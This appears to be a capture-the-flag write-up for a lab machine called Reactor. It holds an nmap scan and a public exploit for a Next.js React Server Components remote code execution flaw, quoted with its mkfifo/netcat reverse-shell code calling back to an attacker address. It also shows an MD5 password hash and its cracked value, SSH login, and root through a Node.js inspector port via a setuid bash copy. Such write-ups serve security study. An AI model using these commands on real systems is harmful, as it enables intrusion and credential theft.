\-----------------------------------------------------------------------------------Reactor writeup--------------------------------------------------------------------------------------------









Step:-1 Reconnaissance:-





nmap -A -sS -P -T4  --min-rate 5000 10.129.8.225

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-28 12:18 UTC

Nmap scan report for 10.129.8.225

Host is up (0.34s latency).

Not shown: 998 closed tcp ports (reset)

PORT     STATE SERVICE VERSION

22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)

|\_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)

3000/tcp open  ppp?

| fingerprint-strings: 

|   GetRequest: 

|     HTTP/1.1 200 OK

|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding

|     x-nextjs-cache: HIT

|     x-nextjs-prerender: 1

|     x-nextjs-stale-time: 4294967294

|     X-Powered-By: Next.js

|     Cache-Control: s-maxage=31536000, 

|     ETag: "p02u6gnhufd8t"

|     Content-Type: text/html; charset=utf-8

|     Content-Length: 17175

|     Date: Thu, 28 May 2026 12:18:20 GMT

|     Connection: close

|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/\_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/\_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/\_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/\_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s

|   HTTPOptions: 

|     HTTP/1.1 400 Bad Request

|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch

|     Allow: GET

|     Allow: HEAD

|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate

|     Date: Thu, 28 May 2026 12:18:21 GMT

|     Connection: close

|   Help, NCP, RPCCheck: 

|     HTTP/1.1 400 Bad Request

|     Connection: close

|   RTSPRequest: 

|     HTTP/1.1 400 Bad Request

|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch

|     Allow: GET

|     Allow: HEAD

|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate

|     Date: Thu, 28 May 2026 12:18:22 GMT

|\_    Connection: close

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

SF-Port3000-TCP:V=7.94SVN%I=7%D=5/28%Time=6A183294%P=x86\_64-pc-linux-gnu%r

SF:(GetRequest,1A5E,"HTTP/1\\.1\\x20200\\x20OK\\r\\nVary:\\x20RSC,\\x20Next-Route

SF:r-State-Tree,\\x20Next-Router-Prefetch,\\x20Next-Router-Segment-Prefetch,

SF:\\x20Accept-Encoding\\r\\nx-nextjs-cache:\\x20HIT\\r\\nx-nextjs-prerender:\\x2

SF:01\\r\\nx-nextjs-stale-time:\\x204294967294\\r\\nX-Powered-By:\\x20Next\\.js\\r

SF:\\nCache-Control:\\x20s-maxage=31536000,\\x20\\r\\nETag:\\x20\\"p02u6gnhufd8t\\

SF:"\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2

SF:017175\\r\\nDate:\\x20Thu,\\x2028\\x20May\\x202026\\x2012:18:20\\x20GMT\\r\\nConn

SF:ection:\\x20close\\r\\n\\r\\n<!DOCTYPE\\x20html><html\\x20lang=\\"en\\"><head><m

SF:eta\\x20charSet=\\"utf-8\\"/><meta\\x20name=\\"viewport\\"\\x20content=\\"width

SF:=device-width,\\x20initial-scale=1\\"/><link\\x20rel=\\"stylesheet\\"\\x20hre

SF:f=\\"/\_next/static/css/414e1be982bc8557\\.css\\"\\x20data-precedence=\\"next

SF:\\"/><link\\x20rel=\\"preload\\"\\x20as=\\"script\\"\\x20fetchPriority=\\"low\\"\\

SF:x20href=\\"/\_next/static/chunks/webpack-db0a529a99835594\\.js\\"/><script\\

SF:x20src=\\"/\_next/static/chunks/4bd1b696-80bcaf75e1b4285e\\.js\\"\\x20async=

SF:\\"\\"></script><script\\x20src=\\"/\_next/static/chunks/517-d083b552e04dead

SF:1\\.js\\"\\x20async=\\"\\"></script><script\\x20s")%r(Help,2F,"HTTP/1\\.1\\x204

SF:00\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n")%r(NCP,2F,"HTTP/1

SF:\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n")%r(HTTPOp

SF:tions,10C,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nvary:\\x20RSC,\\x20Next-

SF:Router-State-Tree,\\x20Next-Router-Prefetch,\\x20Next-Router-Segment-Pref

SF:etch\\r\\nAllow:\\x20GET\\r\\nAllow:\\x20HEAD\\r\\nCache-Control:\\x20private,\\x

SF:20no-cache,\\x20no-store,\\x20max-age=0,\\x20must-revalidate\\r\\nDate:\\x20T

SF:hu,\\x2028\\x20May\\x202026\\x2012:18:21\\x20GMT\\r\\nConnection:\\x20close\\r\\n

SF:\\r\\n")%r(RTSPRequest,10C,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nvary:\\x

SF:20RSC,\\x20Next-Router-State-Tree,\\x20Next-Router-Prefetch,\\x20Next-Rout

SF:er-Segment-Prefetch\\r\\nAllow:\\x20GET\\r\\nAllow:\\x20HEAD\\r\\nCache-Control

SF::\\x20private,\\x20no-cache,\\x20no-store,\\x20max-age=0,\\x20must-revalidat

SF:e\\r\\nDate:\\x20Thu,\\x2028\\x20May\\x202026\\x2012:18:22\\x20GMT\\r\\nConnectio

SF:n:\\x20close\\r\\n\\r\\n")%r(RPCCheck,2F,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request

SF:\\r\\nConnection:\\x20close\\r\\n\\r\\n");

Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)

No exact OS matches for host (test conditions non-ideal).

Network Distance: 2 hops

Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel



TRACEROUTE (using port 995/tcp)

HOP RTT       ADDRESS

1   230.96 ms 10.10.14.1

2   233.79 ms 10.129.8.225



OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 55.76 seconds







\[#] Easy Linux machine, with no HTTP!!



\[#] Not actually, it is diverted on port 3000, look closely at the response HTTP/ 200 ok in the scan report!









\[#] While enumerating it is a react and next.js page, and using wappalyzer i have found the version for Next.js---> 15.0.3





\[#] While looking for any know vulnerabilities for this version i have got this!





Remote Code Execution (CVE-2025-66478 / CVE-2025-55182)Severity: Critical (CVSS 10.0).

Description: A flaw in the React Server Components (RSC) protocol allows unauthenticated attackers to execute arbitrary code on the server. It stems from unsafe deserialization of attacker-controlled data within server-side RSC payloads.









\[#] also i have found a public exploit as well



\-->https://github.com/Spritualkb/CVE-2025-55182-exp.git





\[#] The interesting part of the script was its reverse shell method, i was getting 500 internal error one the default  rev shell payload  









&#x20;   def reverse\_shell(self, attacker\_ip: str, attacker\_port: int) -> dict:

&#x20;       """

&#x20;       Attempt to establish a reverse shell

&#x20;       

&#x20;       @param attacker\_ip: IP address to connect back to

&#x20;       @param attacker\_port: Port to connect back to

&#x20;       """

&#x20;       # mkfifo reverse shell - works on Alpine/busybox containers

&#x20;       revshell = (

&#x20;           **f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>\&1|nc {attacker\_ip} {attacker\_port} >/tmp/f"**

&#x20;       )

&#x20;       

&#x20;       print(Colors.warning(f"Attempting reverse shell to {Colors.highlight(f'{attacker\_ip}:{attacker\_port}')}"))

&#x20;       print(Colors.warning(f"Start listener: {Colors.highlight(f'nc -lvnp {attacker\_port}')}"))

&#x20;       

&#x20;       return self.execute(revshell)











* rm /tmp/f;: Deletes any old temporary files named f in the /tmp directory to avoid conflicts.



* mkfifo /tmp/f;: Creates a brand new "Named Pipe" (First-In, First-Out file buffer) at /tmp/f. Think of this file like a plumbing pipe; anything poured into one end flows right out the other end.



* cat /tmp/f | sh -i 2>\&1: This reads whatever commands land in the /tmp/f pipe, flows them into an interactive shell shell (sh -i), and merges terminal errors (2>\&1) into the main output stream.



* | nc {attacker\_ip} {attacker\_port} >/tmp/f: It takes the results of those shell commands, pipes them across the network via Netcat (nc) to your local machine, and loops your incoming keystrokes right back into the /tmp/f pipe.





\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------





Step-2: Initial Foothold



\[#] Start the nc listnere







\[#] clone the repo and execute the command with --revshell flag!







\[#] Execute the command 





python3 exp.py  http://reactor.htb:3000 --revshell 10.10.\*\*\*\*.\*\*\*\* 6666 



╔═══════════════════════════════════════════════════════════════╗                                   

║  CVE-2025-55182 - React Server Components RCE Exploit      ║                                      

║  Next.js Remote Code Execution Tool                         ║                                     

╚═══════════════════════════════════════════════════════════════╝                                   



\[!] Attempting reverse shell to 10.10.15.169:6666

\[!] Start listener: nc -lvnp 6666

\[\*] Target: http://reactor.htb:3000

\[\*] Command: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>\&1|nc 10.10.\*\*\*\*.\*\*\*\* 6666 >/tmp/f             

\[\*] Sending exploit payload...

\[+] Command executed! Result in redirect: /login?a=rm: cannot remove '/tmp/f': No such file or directory;push 







\[#] On listener





nc -lvnp 6666

listening on \[any] 6666 ...

connect to \[10.10.\*\*\*\*.\*\*\*\*] from (UNKNOWN) \[10.129.8.225] 59398

sh: 0: can't access tty; job control turned off

$ whoami

node







\[#] Now as this is a container, we need escape it via finding some creds 





$ cat reactor.db



PC##Mtablesensor\_logssensor\_logsCREATE TABLE sensor\_logs (

&#x20;   id INTEGER PRIMARY KEY,

&#x20;   timestamp DATETIME DEFAULT CURRENT\_TIMESTAMP,

&#x20;   sensor\_id TEXT,

&#x20;   reading REAL,

&#x20;   status TEXT

)-9tableusersusersCREATE TABLE users (

&#x20;   id INTEGER PRIMARY KEY,

&#x20;   username TEXT NOT NULL,

&#x20;   password\_hash TEXT NOT NULL,

&#x20;   role TEXT NOT NULL,

&#x20;   email TEXT

iiJM5engineer**39d97110eafe2a9a68639812cd271e8e**operatorengineer@reactor.htbIM'/admina203b22191d744a4e70ad\_\_43%025-12-28 14:32:01COOLANT\_FLOW@2ffffffCAUTION33#025-12-28 14:32:01PRESSURE\_01@cffffffNOMINAL43%025-12-28 14:32:01CORE\_TEMP\_01@tHNOMINAL







\[#] We got an MD5 hash 



hashid "39d97110eafe2a9a68639812cd271e8e"

Analyzing '39d97110eafe2a9a68639812cd271e8e'

\[+] MD2 

\[+] MD5 

\[+] MD4 

\[+] Double MD5 

\[+] LM 

\[+] RIPEMD-128 

\[+] Haval-128 

\[+] Tiger-128 

\[+] Skein-256(128) 

\[+] Skein-512(128) 

\[+] Lotus Notes/Domino 5 

\[+] Skype 

\[+] Snefru-128 

\[+] NTLM 

\[+] Domain Cached Credentials 

\[+] Domain Cached Credentials 2 

\[+] DNSSEC(NSEC3) 

\[+] RAdmin v2.x 





\[#] Confirmed MD5







\[#] Crack using hashcat 



**39d97110eafe2a9a68639812cd271e8e:reactor1**





\[#] Got the password for engineer!









Step-3: Privsec 





\[#] Now lets get the ssh for engineer



ssh engineer@reactor.htb  //password reactor1



The authenticity of host 'reactor.htb (10.129.8.225)' can't be established.

ED25519 key fingerprint is SHA256:9v9mCPC4gn2EN/IbKKwhV8KZoNVTsVPorFhlTkNByPM.

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/\[fingerprint])? yes

Warning: Permanently added 'reactor.htb' (ED25519) to the list of known hosts.

engineer@reactor.htb's password: 

&#x20;\_\_\_\_  \_\_\_\_\_    \_    \_\_\_\_ \_\_\_\_\_ \_\_\_  \_\_\_\_  

|  \_ \\| \_\_\_\_|  / \\  / \_\_\_|\_   \_/ \_ \\|  \_ \\ 

| |\_) |  \_|   / \_ \\| |     | || | | | |\_) |

|  \_ <| |\_\_\_ / \_\_\_ \\ |\_\_\_  | || |\_| |  \_ < 

|\_| \\\_\\\_\_\_\_\_/\_/   \\\_\\\_\_\_\_| |\_| \\\_\_\_/|\_| \\\_\\



&#x20;   ReactorWatch Core Monitoring System

&#x20;   Nuclear Dynamics Corp. - Site 7

&#x20;   

&#x20;   AUTHORIZED PERSONNEL ONLY

Last login: Thu May 28 14:31:00 2026 from 10.10.15.169

engineer@reactor:\~$ 







\[#] grab the user flag!







\[#] Now while enumerating i have found an internal port



engineer@reactor:\~$ ss -tulpn

Netid State  Recv-Q  Send-Q   Local Address:Port         Peer Address:Port        Process       

udp   UNCONN 0       0           127.0.0.54:53                0.0.0.0:\*                         

udp   UNCONN 0       0        127.0.0.53%lo:53                0.0.0.0:\*                         

udp   UNCONN 0       0              0.0.0.0:68                0.0.0.0:\*                         

tcp   LISTEN 0       4096     127.0.0.53%lo:53                0.0.0.0:\*                         

**tcp   LISTEN 0       511          127.0.0.1:9229              0.0.0.0:\***                         

tcp   LISTEN 0       4096        127.0.0.54:53                0.0.0.0:\*                         

tcp   LISTEN 0       4096           0.0.0.0:22                0.0.0.0:\*                         

tcp   LISTEN 0       4096              \[::]:22                   \[::]:\*                         

tcp   LISTEN 0       511                  \*:3000                    \*:\* 





\[!] Port 9229 is the default TCP port used for Node.js and V8 inspector protocol debugging. It allows you to connect your code and external development tools so you can set breakpoints, pause execution, and inspect variables.





\[#] By this we can determine that a Node.js process was running with the --inspect flag enabled internally, means we can pass the javascript inside the inspect!









engineer@reactor:\~$ node inspect 127.0.0.1:9229

connecting to 127.0.0.1:9229 ... ok

debug> exec("process.mainModule.require('child\_process').execSync('id')")

Uint8Array(39)  #Of course it won't gonna show the output directly!

debug> exec("process.mainModule.require('child\_process').execSync('whoami')")

Uint8Array(5)

debug> exec("process.mainModule.require('child\_process').execSync('cp /bin/bash /tmp/rootbash \&\& chmod +s /tmp/rootbash')")

Uint8Array(0)





\[#] We can execute any RCE command with process.mainModule.require('child\_process').execSync, so we did. now just grab the shell



engineer@reactor:/sys$ /tmp/rootbash -p

rootbash-5.2# ls

block  dev       fs          module

bus    devices   hypervisor  power

class  firmware  kernel

rootbash-5.2# cd /root

rootbash-5.2# ls

root.txt





\[!] Done!!





